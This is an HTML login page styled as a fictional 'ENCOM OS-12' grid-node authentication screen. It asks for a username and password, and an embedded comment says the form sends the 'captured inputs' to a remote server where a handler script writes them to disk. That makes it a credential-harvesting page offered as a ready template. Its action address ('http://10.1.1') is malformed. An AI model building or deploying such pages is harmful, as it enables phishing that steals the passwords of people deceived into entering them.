<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ENCOM OS-12 Login</title>
    <style>
        body { background-color: #000; color: #00ffcc; font-family: monospace; padding: 50px; }
        .login-box { border: 2px solid #00ffcc; padding: 20px; width: 300px; margin: 0 auto; box-shadow: 0 0 15px #00ffcc; }
        input[type="text"], input[type="password"] { width: 100%; margin-bottom: 10px; background: #111; color: #fff; border: 1px solid #00ffcc; padding: 5px; box-sizing: border-box; }
        input[type="submit"] { background: #00ffcc; color: #000; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; }
        input[type="submit"]:hover { background: #00b38f; }
        h2 { text-align: center; margin-top: 0; }
    </style>
</head>
<body>

<div class="login-box">
    <h2>Grid Node Authentication</h2>
    
    <!-- 
      The action parameter sends the captured inputs straight to your central server,
      allowing a remote handler script to record the text to disk.
    -->
    <form action="http://10.1.1" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required autocomplete="off">
        
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        
        <input type="submit" value="ESTABLISH HANDSHAKE">
    </form>
</div>

</body>
</html>
